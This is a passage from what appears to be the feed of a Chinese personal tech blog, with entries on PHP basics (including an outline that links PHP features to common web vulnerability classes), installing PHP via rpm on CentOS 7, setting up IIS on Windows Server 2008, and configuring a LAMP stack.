href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><ul><li>代码规范</li><li>变量以及常量</li><li>数据类型</li><li>输入（重点了解 $_GET $_POST $_SERVER $_REQUEST）</li><li><p>输出（echo var_dump）</p></li><li><p>各种运算符</p></li><li><p>数组（类型，数组操作添加输出元素，foreach输出元素）</p></li><li><p>字符串常用函数（count,strlen,str_split,chr,md5,htmlentities,addslashes,trim,strcmp）</p></li><li><p>条件控制（if(){}else{}, switch(){case:break;}）</p></li><li><p>循环控制（for,foreach,while,do while）</p></li><li><p>函数（创建,传参，获取结果）</p></li><li><p>对象（能够看懂，可以自行深究）</p></li></ul><h2 id="表单操作"><a href="#表单操作" class="headerlink" title="表单操作"></a>表单操作</h2><ul><li>$_GET $_POST $_SERVER $_REQUEST</li></ul><h2 id="文件操作（漏洞任意文件读取）"><a href="#文件操作（漏洞任意文件读取）" class="headerlink" title="文件操作（漏洞任意文件读取）"></a>文件操作（漏洞任意文件读取）</h2><ul><li>fopen打开文件</li><li>fwrite写文件</li><li>unlink删除文件</li><li>读写模式</li><li>file_get_contents</li><li>file_put_content</li><li>可以使用PHP伪协议进行读文件（附加）以及任意文件读取（目录跳跃）</li></ul><h2 id="命令执行以及代码执行（漏洞代码命令执行）"><a href="#命令执行以及代码执行（漏洞代码命令执行）" class="headerlink" title="命令执行以及代码执行（漏洞代码命令执行）"></a>命令执行以及代码执行（漏洞代码命令执行）</h2><ul><li><p>system</p></li><li><p>eval</p></li></ul><h2 id="文件包含（漏洞任意文件包含）"><a href="#文件包含（漏洞任意文件包含）" class="headerlink" title="文件包含（漏洞任意文件包含）"></a>文件包含（漏洞任意文件包含）</h2><ul><li>include </li><li>require </li></ul><h2 id="文件上传（漏洞文件上传）"><a href="#文件上传（漏洞文件上传）" class="headerlink" title="文件上传（漏洞文件上传）"></a>文件上传（漏洞文件上传）</h2><ul><li><p>$_FILES</p></li><li><p>获取文件内容</p></li><li><p>获取文件信息</p></li><li><p>处理上传的文件</p></li></ul><h2 id="Cookie和Session（漏洞cookie伪造）"><a href="#Cookie和Session（漏洞cookie伪造）" class="headerlink" title="Cookie和Session（漏洞cookie伪造）"></a>Cookie和Session（漏洞cookie伪造）</h2><ul><li>setcookie</li><li><p>_COOKIE </p></li><li><p>session_start</p></li><li><p>$_SESSION</p></li><li><p>session_destroy</p></li></ul><h2 id="数据库操作（漏洞注入）"><a href="#数据库操作（漏洞注入）" class="headerlink" title="数据库操作（漏洞注入）"></a>数据库操作（漏洞注入）</h2><p>Mysql + PHP</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;HTML-CSS&quot;&gt;&lt;a href=&quot;#HTML-CSS&quot; class=&quot;headerlink&quot; title=&quot;HTML + CSS&quot;&gt;&lt;/a&gt;HTML + CSS&lt;/h1&gt;&lt;h2 id=&quot;常用标签&quot;&gt;&lt;a href=&quot;#常用标签&quot; class=&quot;headerli
      
    
    </summary>
    
    
      <category term="php,漏洞" scheme="https://clancyb00m.github.io/tags/php-%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>php(以代码层面出发)</title>
    <link href="https://clancyb00m.github.io/2018/12/13/php(%E4%BB%A5%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2%E5%87%BA%E5%8F%91)/"/>
    <id>https://clancyb00m.github.io/2018/12/13/php(以代码层面出发)/</id>
    <published>2018-12-13T04:30:00.000Z</published>
    <updated>2018-12-30T10:47:19.579Z</updated>
    
    <content type="html"><![CDATA[<h1 id="语言基础"><a href="#语言基础" class="headerlink" title="语言基础"></a>语言基础</h1><ul><li>php文件的后缀名：<code>.php</code></li><li>php区分大小写，关键字和函数名不区分大小写</li><li>php所有代码不会在前端显示</li><li>注释：<ul><li>单行注释：<code>//</code>或<code>#</code></li><li>多行注释：<code>/* 注释内容 */</code></li></ul></li></ul><h1 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h1><ul><li><p>变量：</p><ul><li>可以包含<code>字母</code>，<code>数字</code>，<code>下划线</code></li><li>以<code>$</code>开始</li><li>不能以数字开头</li></ul></li><li><p><code>{}</code>：可以包住变量，如<code>{$a}</code>，用途：可在变量后紧跟其他内容，无需空格</p></li><li><p>赋值传值和引用传值</p><ul><li><p>赋值传值：    $a = 1;</p><p>​            $b = $a;</p><p>​            $a = 2;        <code>重新给$a赋值</code></p><p>​            echo $b;        <code>$b的值不变，还是1</code></p></li><li><p>引用传值：     $a = 1;</p><p>​            $b = &amp;$a;</p><p>​            $a = 2;</p><p>​            echo $b;        <code>结果为2</code></p></li></ul></li></ul><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><ul><li>数据类型：<ul><li>标量数据类型：整形<code>int</code>，浮点型<code>float</code>，布尔型<code>bool</code>，字符型<code>string</code><ul><li>布尔型<code>bool(false)</code>有哪些：<code>false</code> ，<code>整形0</code>， <code>浮点型0.0</code>， <code>空字符串“”</code>，  <code>字符串“0”</code>， <code>空数组</code>， <code>null</code>，其余全是<code>bool(true)</code></li><li>整形<code>int</code>：可以用<code>十进制</code>、<code>八进制(0开头)</code>、<code>十六进制(0x开头)</code>进行赋值</li><li>字符型<code>string</code>：在单引号<code>&#39;&#39;</code>里变量不会被解析</li></ul></li><li>复合数据类型：数组<code>array</code>，对象<code>object</code></li><li>特殊数据类型：资源<code>resource</code>，空<code>null</code><ul><li><code>null</code>：这些情况被认为null：<code>被赋值为null</code>， <code>尚未赋值</code> ，<code>被unset()</code></li></ul></li></ul></li><li>判断数据类型<ul><li><code>var_dump()</code><ul><li>在UTF-8编码下，一个汉字用3个字节表示；在GBK下，一个汉字用2个字节表示</li></ul></li><li>通过<code>is</code>函数判断数据类型<ul><li><code>is_bool()</code>，<code>is_float()</code>，<code>is_int()</code>，<code>is_numeric()</code>等等</li></ul></li></ul></li><li>EOF：处理长字符串<ul><li>以<code>&lt;&lt;&lt;EOF</code>开始，<code>EOF</code>结束</li><li>“EOF”可以自定义名称，叫什么都可以</li><li><code>EOF</code>表示字符串的结束，<b>必须放在行首，不能缩进，单独一行</b></li><li>在<code>EOF</code>中，特殊字符不需要转义</li></ul></li><li>反斜杠<code>\</code>：用来转义被程序语法结构占用了的特殊字符</li><li>检查变量是否设置<ul><li><code>isset()</code>函数</li><li><code>empty()</code>函数</li></ul></li><li>强制数据类型转换：在变量前加上英文小括号并写入要转换的数据类型，如：<code>(bool)$a</code>，<code>(int)$a</code><ul><li>其它类型转成字符串，有以下规则：<ul><li>布尔值<code>true</code>转为字符串<code>1</code>，<code>false</code>转为字符串<code>&quot;&quot;</code>（空字符串）</li><li>整数或浮点数转换成数值型的字符串</li><li>数组将被转换成字符串<code>&quot;array&quot;</code></li><li><code>null</code>将被转换成空字符串</li></ul></li><li>其它类型转成整形或浮点型，有以下规则：<ul><li>布尔值<code>false</code>转成<code>0</code>，<code>true</code>转成<code>1</code></li><li>浮点数转成整形，数字被取整（小数位被丢弃）</li><li>如果字符串以合法的数字开头，这个数字可直接转成数值；否则，被转成<code>0</code></li></ul></li></ul></li></ul><h1 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h1><ul><li>常量<ul><li>不要在常量前加美元符号<code>$</code></li><li>定义：<code>define(name,value[,flag])</code><ul><li>name：变量名</li><li>value：变量值</li><li>flag：可选项，规定常量名是否对大小写敏感。<code>true</code>敏感，<code>false</code>不敏感</li></ul></li></ul></li><li>系统常量<ul><li><code>__FILE__</code>：PHP程序文件名</li><li><code>__LINE__</code>：PHP程序当前行号</li><li><code>PHP_VERSION</code>：PHP程序版本号</li><li><code>PHP_OS</code>：操作系统名称</li><li><code>TRUE</code>：真值</li><li><code>FALSE</code>：假值</li><li><code>NULL</code>：一个null值</li><li><code>E_ERROR</code>：这个常量指到最近的错误处</li><li><code>E_WARNING</code>：这个常量指到最近的警告处</li><li><code>E_PARSE</code>：这个常量指到解析语法有潜在问题处</li><li><code>E_NOTICE</code>：这个常量为发生不寻常但不一定是错误处</li></ul></li></ul><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>算数运算符，逻辑运算符，比较运算符，赋值运算符，字符串运算符，条件运算符</p><ul><li>算术运算符：<code>+</code>，<code>-</code>，<code>*</code>，<code>/</code>，<code>%</code>，<code>++</code>，<code>--</code></li><li>字符串运算符：<code>.</code>，<code>.=</code></li><li>赋值运算符：<code>=</code>，<code>-=</code>，<code>+=</code>，<code>*=</code>，<code>/=</code>，<code>%=</code></li><li>比较运算符：<code>&gt;</code>，<code>&lt;</code>，<code>&gt;=</code>，<code>&lt;=</code>，<code>==</code>，<code>===</code>，<code>!=</code>，<code>!==</code>，<code>&lt;&gt;</code></li><li>逻辑运算符：<code>and(&amp;&amp;)</code>，<code>or(||)</code>，<code>not(!)</code></li><li>条件运算符：<code>?:</code></li></ul><h1 id="流程控制"><a href="#流程控制" class="headerlink" title="流程控制"></a>流程控制</h1><ul><li><p>if条件判断</p><ul><li>if(){}</li><li>if(){}else{}</li><li>if(){}elseif(){}else…</li></ul></li><li><p>while循环：先判断，后循环</p><p>​    $i = 0;</p><p>​    while($i&lt;100){</p><p>​        echo $i;</p><p>​    }</p></li><li><p>do  while循环：先循环一次，在进行判断</p><p>​    $i = 0;</p><p>​    do{</p><p>​        echo $i;</p><p>​    }while($i&gt;100)</p></li><li><p>switch分支语句：通过一个条件来选择要执行的代码</p><p>​    switch(参数或表达式){</p><p>​    case 值1:</p><p>​        code1;</p><p>​        break;</p><p>​    default:</p><p>​        code;</p><p>​        break;</p><p>​    }</p></li><li><p>for循环</p><ul><li><p>for(初始化;条件判断;条件更新){</p><p>​    循环体语句块;</p><p>}</p></li></ul></li><li><p>break语句：无条件结束循环，使程序跳转到大括号之后，break可接受参数来决定跳出几层循环，默认只跳出当前循环</p></li><li><p>continue语句：结束本次循环，也可接受一个参数，来决定跳出几重循环</p></li></ul><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><ul><li><p>分类</p><ul><li>索引数组：下标为整数的数组</li><li>关联数组：下标为字符串的数组</li><li>多维数组：数组的一个或多个元素是数组</li></ul></li><li><p>创建数组</p><ul><li>使用数组标识符<code>[]</code>来创建数组：<ul><li>语法：$arr[key] = value;</li></ul></li><li>使用array函数来创建：<ul><li>语法：$arr = array([key=&gt;]value,…);</li></ul></li></ul></li><li><p>unset()函数：删除数组元素</p><ul><li><p>只删除元素，但保留其结构</p><ul><li><p>解析：    $arr = [1,2,3,4,5];</p><p>​        foreach($arr as $i=&gt;$value){unset($arr[$i]);}</p><p>​        $arr[] = 100;    <code>此时，值为100的键名为5</code></p></li></ul></li></ul></li><li><p>foreach()函数：（只能）遍历数组</p><ul><li>语法：<pre><code>1. foreach($arr as $value){`code;`}2. foreach($arr as $key =&gt; $value){`code;`}</code></pre></li></ul></li><li><p>其他一些数组操作函数：<code>count()</code>，<code>array_shift</code>，<code>array_pop()</code>，<code>array_reverse</code>，<code>array_flip()</code>……</p></li><li><p>PHP全局数组</p><ul><li>$_SERVER<ul><li>$_SERVER[‘SERVER_ADDR’]：服务器IP地址</li><li>$_SERVER[‘REMOTE-ADDR’]：客户端IP地址</li><li>$_SERVER[‘SERVER_NAME’]：服务器域名称</li></ul></li><li>$_GET</li><li>$_POST</li><li>$_FILES</li><li>$_REQUEST</li><li>$_SESSION</li></ul></li></ul><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><ul><li><p>必须由<code>function</code>关键字开头来定义一个函数</p></li><li><p>函数名的命名规则和变量一样，函数名不能以<code>$</code>开头</p></li><li><p>函数名后紧跟括号()，()中包含参数，参数是函数将从调用者处获得的值，参数可有可无，数量根据需要而定</p></li><li><p>函数代码块在定义时不会执行，只有在被调用时才执行</p></li><li><p>可以使用<code>return</code>返回值</p></li><li><p>参数：</p><ul><li><p>值传递：正常的写法</p></li><li><p>引用传递：在参数前加上<code>&amp;</code></p><ul><li><p>解析：    $arr = array(1,2,3,4);</p><p>​        function addElement(&amp;$arr){</p><p>​            $arr[count($arr)] = 100;</p><p>​            print_r($arr);            <code>//在函数内输出$arr</code></p><p>​        }</p><p>​        addElement($arr);</p><p>​        print_r($arr);                <code>//在函数外输出$arr</code></p></li></ul></li><li><p>默认值传递：传递一个默认的值，在调用是可以根据情况指定或不指定</p><ul><li><p>解析：    function func1($who,$animal = ‘猪’){</p><p>​            echo “$who 是 $animal”;</p><p>​        }</p><p>​        func1(‘老鹰’，‘鸟’)；</p><p>​        func1(‘你’)；                    <code>过于真实，举报了！</code></p></li></ul></li></ul></li><li><p>函数变量的作用域：在PHP中，函数外部与内部的变量不能通用，必须在声明变量时加上<code>global</code>关键字才可以</p><ul><li><code>global</code>关键字只能在函数内使用</li><li>不能在声明变量的同时赋值</li></ul></li><li><p>内置函数</p><ul><li><code>include</code>：如果指定文件有错，则报警告并继续执行</li><li><code>require</code>：如果指定文件有错，则报致命错误并终止运行</li></ul></li><li><p>PHP内置了各种函数，比如：</p><ul><li>日期和时间函数</li><li>数学函数</li><li>HTTP函数</li><li>URL函数</li><li>字符串操作函数</li><li>等等……</li></ul></li></ul><h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;语言基础&quot;&gt;&lt;a href=&quot;#语言基础&quot; class=&quot;headerlink&quot; title=&quot;语言基础&quot;&gt;&lt;/a&gt;语言基础&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;php文件的后缀名：&lt;code&gt;.php&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;php区分大小写，关键字和函数名不区分
      
    
    </summary>
    
    
      <category term="php" scheme="https://clancyb00m.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>rpm安装php</title>
    <link href="https://clancyb00m.github.io/2018/12/07/rpm%E5%AE%89%E8%A3%85php/"/>
    <id>https://clancyb00m.github.io/2018/12/07/rpm安装php/</id>
    <published>2018-12-07T04:31:00.000Z</published>
    <updated>2018-12-30T10:47:45.699Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>本文可能有点乱，右边有个目录，看着那个来就行了</p></blockquote><blockquote><p>本文讲述linux（centos7）使用rpm安装php的过程<br>rpm安装软件的命令是这样的：rpm -ivh 软件名  </p><ol><li>-i –install,安装</li><li>-v –verbose,详细过程</li><li>-h –hash,显示进度信息</li></ol></blockquote><p>过程中会遇到依赖包的问题，一个一个解决掉就完事儿了！  </p><h1 id="开始安装"><a href="#开始安装" class="headerlink" title="开始安装"></a>开始安装</h1><p>解压<code>php.rat.gz</code><br><img src="/img/rpm/tarphp01.png" alt="解压php"><br>进入<code>packages</code>目录中，有5个文件，都是安装包，这篇文章主线就是安装这五个包，随便执行一个瞅瞅<br><img src="/img/rpm/ls.png" alt="ls">  </p><h1 id="安装httpd…"><a href="#安装httpd…" class="headerlink" title="安装httpd…"></a>安装httpd…</h1><p><img src="/img/rpm/httpd01.png" alt="安装httpd-2.4.6"><br>这个错误中说明安装此程序需要四个依赖，不过其中有一个依赖（<code>http-tools...</code>）在我解压<code>php.tar.gz</code>的时候里面有，所以，可以先安装那个试一试  </p><h1 id="①安装httpd-tools…"><a href="#①安装httpd-tools…" class="headerlink" title="①安装httpd-tools…"></a>①安装httpd-tools…</h1><p><img src="/img/rpm/ls.png" alt="ls"><br><img src="/img/rpm/httpdtools01.png" alt="httpdtools"><br>缺少这两个依赖包，去镜像站下载，我这里用的华为的镜像站，下载好，传到虚拟机里面来，如下：<br><img src="/img/rpm/apr01.png" alt="安装apr">  </p><h5 id="安装apr…"><a href="#安装apr…" class="headerlink" title="安装apr…"></a>安装apr…</h5><p><img src="/img/rpm/apr02.png" alt="apr"><br>成功！  </p><h5 id="安装apr-util…："><a href="#安装apr-util…：" class="headerlink" title="安装apr-util…："></a>安装apr-util…：</h5><p><img src="/img/rpm/aprutil01.png" alt="apr-util"><br>成功！</p><blockquote><p>注：如果安装这两个顺序反了，可能会出错，不过也没啥，可能错误就是<code>apr-util</code>被<code>apr</code>依赖，那你先安装<code>apr</code>就ojbk了  </p></blockquote><h5 id="继续安装httpd-tools…"><a href="#继续安装httpd-tools…" class="headerlink" title="继续安装httpd-tools…"></a>继续安装httpd-tools…</h5><p><img src="/img/rpm/httpdtools02.png" alt="httpdtools"><br>成功！  </p><h1 id="②安装httpd…"><a href="#②安装httpd…" class="headerlink" title="②安装httpd…"></a>②安装httpd…</h1><p><img src="/img/rpm/ls.png" alt="ls"><br><img src="/img/rpm/httpd02.png" alt="httpd"><br>这里有个坑！在镜像站里面是找不到<code>/etc/mime.types</code>这个货的，像这种错误信息里给出的名字和安装包的名字不一样的恶心情况，有两种解决办法：  </p><blockquote><ol><li>使用<code>yum</code>安装httpd，然后查看安装过程，找到<code>/etc/mime.types</code>，看紧跟着它下面要安装的包的名字，就是我们要找的玩意儿<br><img src="/img/rpm/mailcap01.png" alt="mailcap">  </li><li>Google一下，你全知道<br>所以我是Google出来看到别的大佬用的第一种方法找到然后分享的，然后我就直接去镜像站找了这个货，传进虚拟机，装它  </li></ol></blockquote><h5 id="安装mailcap…"><a href="#安装mailcap…" class="headerlink" title="安装mailcap…"></a>安装mailcap…</h5><p><img src="/img/rpm/mailcap02.png" alt="mailcap"><br>成功！！  </p><h5 id="继续安装httpd…"><a href="#继续安装httpd…" class="headerlink" title="继续安装httpd…"></a>继续安装httpd…</h5><p><img src="/img/rpm/httpd03.png" alt="httpd"><br>成功！  </p><h3 id="安装php…"><a href="#安装php…" class="headerlink" title="安装php…"></a>安装php…</h3><p><img src="/img/rpm/ls.png" alt="ls"><br><img src="/img/rpm/php01.png" alt="php"><br>这里说明一点，这三个包是相互依赖的关系，不管你先装哪个，最后出错了，还是要按照这个顺序来，所以我就直接按照这个<code>正确</code>的顺序来装了：  </p><h1 id="③安装php-common…"><a href="#③安装php-common…" class="headerlink" title="③安装php-common…"></a>③安装php-common…</h1><p><img src="/img/rpm/ls.png" alt="ls"><br><img src="/img/rpm/php02.png" alt="php-common"><br>缺少这个玩意儿，去镜像站下载，传过来，装它：  </p><h5 id="安装libzip…"><a href="#安装libzip…" class="headerlink" title="安装libzip…"></a>安装libzip…</h5><p><img src="/img/rpm/libzip01.png" alt="libzip"><br>成功！  </p><h5 id="继续安装php-common…"><a href="#继续安装php-common…" class="headerlink" title="继续安装php-common…"></a>继续安装php-common…</h5><p><img src="/img/rpm/php03.png" alt="php-common"><br>成功！  </p><h1 id="④安装php-cli…"><a href="#④安装php-cli…" class="headerlink" title="④安装php-cli…"></a>④安装php-cli…</h1><p><img src="/img/rpm/ls.png" alt="ls"><br><img src="/img/rpm/php04.png" alt="php-cli"><br>这里！这里！是最恶心的一个地方！首先，找不到<code>libcrypto</code>这个玩意儿，然后发现这个是<code>openssl</code>的扩展还是依赖，就是最后发现是因为<code>openssl</code>的版本过低，然后去更新版本，如果通过rpm来装，好像有三十多个依赖包，我崩溃了。所以我选择用<code>yum</code>来装，<code>yum</code>大法好！！  </p><h5 id="yum安装openssl"><a href="#yum安装openssl" class="headerlink" title="yum安装openssl"></a>yum安装openssl</h5><p><img src="/img/rpm/openssl01.png" alt="yumINSTALLopenssl"><br><img src="/img/rpm/openssl02.png" alt="yumINSTALLopenssl"><br>成功！  </p><h5 id="继续安装php-cli…"><a href="#继续安装php-cli…" class="headerlink" title="继续安装php-cli…"></a>继续安装php-cli…</h5><p><img src="/img/rpm/php05.png" alt="php-cli"><br>成功！  </p><h1 id="⑤安装php…"><a href="#⑤安装php…" class="headerlink" title="⑤安装php…"></a>⑤安装php…</h1><p><img src="/img/rpm/ls.png" alt="ls"><br><img src="/img/rpm/php06.png" alt="php"><br>大功告成！！！！！！  </p><h1 id="查看是否安装成功"><a href="#查看是否安装成功" class="headerlink" title="查看是否安装成功"></a>查看是否安装成功</h1><p>查看PHP版本即可：<br><img src="/img/rpm/php07.png" alt="phpversion">  </p><blockquote><p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本文可能有点乱，右边有个目录，看着那个来就行了&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;本文讲述linux（centos7）使用rpm安装php的过程&lt;br&gt;rpm安装软件的命令是这样的：rpm -ivh 软件名  &lt;/
      
    
    </summary>
    
    
      <category term="rpm" scheme="https://clancyb00m.github.io/tags/rpm/"/>
    
  </entry>
  
  <entry>
    <title>Windows搭建IIS</title>
    <link href="https://clancyb00m.github.io/2018/12/06/windows%E6%90%AD%E5%BB%BAiis/"/>
    <id>https://clancyb00m.github.io/2018/12/06/windows搭建iis/</id>
    <published>2018-12-06T04:30:01.000Z</published>
    <updated>2018-12-30T10:47:58.272Z</updated>
    
    <content type="html"><![CDATA[<p>本次使用的虚拟机是<code>Windows Server 2008 R2</code>，我要在上面搭建<code>iis</code>服务，并运行一个<code>asp</code>的网站。  </p><ul><li>前提：<br>需要以下两个文件：</li></ul><ol><li>.net framework 4.7.2</li><li>一个asp的网站源码  </li></ol><p><img src="/img/181206/start01.png" alt="准备操作"><br>操作步骤如下：  </p><h1 id="安装IIS"><a href="#安装IIS" class="headerlink" title="安装IIS"></a>安装IIS</h1><p><img src="/img/181206/iis01.png" alt="安装IIS"><br><img src="/img/181206/iis02.png" alt="安装IIS"><br><img src="/img/181206/iis03.png" alt="安装IIS"><br>之后再次点击下一步<br><img src="/img/181206/iis04.png" alt="安装IIS"><br><img src="/img/181206/iis05.png" alt="安装IIS"><br><img src="/img/181206/iis06.png" alt="安装IIS"><br><img src="/img/181206/iis07.png" alt="安装IIS"><br><img src="/img/181206/iis08.png" alt="安装IIS"><br><img src="/img/181206/iis09.png" alt="安装IIS"><br>好无聊，iis装完了！照我这样选，基本的东西都有！</p><h1 id="配置IIS"><a href="#配置IIS" class="headerlink" title="配置IIS"></a>配置IIS</h1><p><img src="/img/181206/iis10.png" alt="安装IIS">  </p><h3 id="删除默认网站和应用池"><a href="#删除默认网站和应用池" class="headerlink" title="删除默认网站和应用池"></a>删除默认网站和应用池</h3><p><img src="/img/181206/iis11.png" alt="安装IIS">  </p><h3 id="添加网站"><a href="#添加网站" class="headerlink" title="添加网站"></a>添加网站</h3><p><img src="/img/181206/iis12.png" alt="安装IIS"><br><img src="/img/181206/iis13.png" alt="安装IIS"><br>然后导入网站数据  </p><h3 id="改权限"><a href="#改权限" class="headerlink" title="改权限"></a>改权限</h3><blockquote><p>改权限是为了能对网站进行各种操作<br><img src="/img/181206/iis14.png" alt="安装IIS"><br><img src="/img/181206/iis15.png" alt="安装IIS"><br><img src="/img/181206/iis16.png" alt="安装IIS">  </p></blockquote><h3 id="启用父路径"><a href="#启用父路径" class="headerlink" title="启用父路径"></a>启用父路径</h3><p><img src="/img/181206/iis17.png" alt="安装IIS"><br>False改为True<br><img src="/img/181206/iis18.png" alt="安装IIS">  </p><h3 id="更改默认首页"><a href="#更改默认首页" class="headerlink" title="更改默认首页"></a>更改默认首页</h3><p><img src="/img/181206/iis19.png" alt="安装IIS"><br>这里去看下载的网站的源码，默认首页是什么格式的这里就怎么写<br><img src="/img/181206/iis20.png" alt="安装IIS">  </p><h3 id="启用32位程序"><a href="#启用32位程序" class="headerlink" title="启用32位程序"></a>启用32位程序</h3><p><img src="/img/181206/iis21.png" alt="安装IIS"><br><img src="/img/181206/iis22.png" alt="安装IIS">  </p><h3 id="选择-net-4版本"><a href="#选择-net-4版本" class="headerlink" title="选择.net 4版本"></a>选择.net 4版本</h3><p>由于我事前并没有安装，所以无法修改，所以这里没有截图，操作步骤同上，在选择<code>高级设置</code>的时候，这回选择<code>基本设置</code>，就可以在里面修改了。  </p><blockquote><p>如果本文有任何错误，欢迎留言给我：<a href="https://github.com/clancyb00m/clancyb00m.github.io/issues" target="_blank" rel="noopener">Contact Me！</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;本次使用的虚拟机是&lt;code&gt;Windows Server 2008 R2&lt;/code&gt;，我要在上面搭建&lt;code&gt;iis&lt;/code&gt;服务，并运行一个&lt;code&gt;asp&lt;/code&gt;的网站。  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;前提：&lt;br&gt;需要以下两个文件：&lt;/li&gt;
&lt;/u
      
    
    </summary>
    
    
      <category term="windows,iis,搭建,asp" scheme="https://clancyb00m.github.io/tags/windows-iis-%E6%90%AD%E5%BB%BA-asp/"/>
    
  </entry>
  
  <entry>
    <title>LAMP环境搭建与配置</title>
    <link href="https://clancyb00m.github.io/2018/12/05/LAMP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E4%B8%8E%E9%85%8D%E7%BD%AE/"/>
    <id>https://clancyb00m.github.io/2018/12/05/LAMP环境搭建与配置/</id>
    <published>2018-12-05T04:30:00.000Z</published>
    <updated>2018-12-30T10:47:11.399Z</updated>
    
    <content type="html"><![CDATA[<h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>本次搭建用的是<code>centos6</code>的虚拟机，是<a href="https://www.cleverbao.blog" target="_blank" rel="noopener">大佬</a>直接传给我的虚拟机，所有就存在了一个问题，克隆的虚拟机会出现网卡找不到的情况<br><img src="/img/181205/noeth001.png" alt="网卡找不到"><br>解决方法就是:  </p><ol><li><p>执行命令：  </p><pre><code>cat /etc/udev/rules.d/70-persistent-net.rules  </code></pre><p>查看里面最下面的网卡名称和MAC地址<br><img src="/img/181205/udev70net01.png" alt="udev70">  </p></li><li><p>然后打开网卡配置信息并修改  </p><pre><code>vi /etc/sysconfig/network-scripts/ifcfg-eth0 </code></pre><p><img src="/img/181205/eth101.png" alt="eth1"><br>然后重启网卡就可以了，执行命令：  </p><pre><code>service network restart  </code></pre><p>现在我们开始安装LAMP！</p><h1 id="搭建LAMP"><a href="#搭建LAMP" class="headerlink" title="搭建LAMP"></a>搭建LAMP</h1><p>LAMP=LINUX+APACHE+MYSQL+PHP  </p></li></ol><ul><li>这是在Linux下最常见的提供web服务的组合之一  </li><li>Linux 是免费开源软件，这意味着源代码可用的操作系统  </li><li>Apache 是使用中最受欢迎的一个开放源码的WEB服务器软件  </li><li>MySQL 是多线程、多用户的SQL数据库管理系统  </li><li>PHP 是一种编程语言最初设计生产动态网站。PHP 是主要用于服务器端的应用程序软件  </li></ul><p>接下来我们开始安装，为了方便，我们直接使用<code>yum</code>来安装</p><h3 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h3><ol><li><p>执行命令：  </p><pre><code>yum install httpd httpd-devel httpd-manual mod_ssl mod_perl mod_auth_mysql  </code></pre><p><img src="/img/181205/httpd01.png" alt="安装httpd"></p></li><li>装完之后，在启动前，需要解决一个错误：<br><img src="/img/181205/error01.png" alt="servername"><br>首先验证你有没有这个错误，直接执行命令<code>httpd</code>看是否和上面错误一样，如果一样，那我们就来解决它  </li><li><p>我们先停止<code>httpd</code>服务，执行命令<code>service httpd stop</code>,打开<code>httpd.conf</code>配置文件，修改<code>ServcerName</code>，使域名生效，所以我们来执行命令：  </p><pre><code>vi /etc/httpd/conf/httpd.conf  /exam   :为了更快速的找到servername</code></pre><p>把<code>#</code>去掉，完事儿  </p></li><li><p>启动<code>httpd</code>：  </p><pre><code>service httpd start  </code></pre><p>这个时候去使用ip访问时访问不了的，因为防火墙有拦截，防火墙这么做，是为了防止网站受到攻击，之前我们直接关闭了防火墙去做访问，但是这样很不安全，所以我们就需要修改防火墙的规则来在防火墙开启的状态下又能正常访问  </p></li><li><p>修改防火墙规则<br>在<code>centos6</code>中，防火墙规则是放在一个文件中的，<code>centos7</code>中是通过命令修改的，这是不一样的地方<br>打开防火墙规则文件，修改就完事儿了  </p><pre><code>vi /etc/sysconfig/iptables  </code></pre><p>在里面我们需要加入一条规则：  </p><pre><code>-A INPUT -p tcp -m tcp --dport 80 -j ACCEPT  </code></pre><p>这里要说明两点：  </p><blockquote><ol><li>这条命令要加在这条命令：<img src="/img/181205/reject01.png" alt="拒绝所有数据访问">之前，因为这条命令拒绝所有数据包访问，而防火墙规则是从上到下执行的，我们需要写在这条命令前面才能生效  </li><li>解释一下这条命令：<code>-A</code>：追加规则，<code>-INPUT</code>：别人请求你，<code>-p</code>：指定协议类型，<code>-m</code>：启用扩展功能，<code>--dport</code>：<code>-p</code>的扩展，指定端口，<code>-j</code>：指定这条规则如何进行处理，<code>ACCEPT</code>表示通过  </li></ol></blockquote></li></ol><p>之后重启防火墙即可  </p><pre><code>service iptables restart  </code></pre><p><img src="/img/181205/iptables01.png" alt="重启防火墙"><br>成功访问：<br><img src="/img/181205/apache01.png" alt="访问Apache"><br>设置开机自启：  </p><pre><code>chkconfig httpd on  </code></pre><h3 id="安装MySQL"><a href="#安装MySQL" class="headerlink" title="安装MySQL"></a>安装MySQL</h3><ol><li><p>执行命令：</p><pre><code>yum install mysql mysql-server mysql-devel  </code></pre><p><img src="/img/181205/mysql01.png" alt="安装MySQL"><br>至此MySQL就安装完成  </p></li><li><p>启动<code>MySQL</code>  </p><pre><code>service mysqld start  </code></pre><p><img src="/img/181205/mysql02.png" alt="启动MySQL"><br><img src="/img/181205/mysql03.png" alt="启动MySQL02">  </p></li><li><p>初始化<code>MySQL</code>  </p><pre><code>mysql_secure_installation  </code></pre><p>在这里需要设置<code>MySQL</code>数据库密码：<br><img src="/img/181205/mysql04.png" alt="设置MySQL密码"><br>之后一路回车就完事儿了<br><img src="/img/181205/mysql05.png" alt="完成安装MySQL"><br>设置开机自启：  </p><pre><code>chkconfig mysqld on  </code></pre><p>至此<code>MySQL</code>就安装完成了！  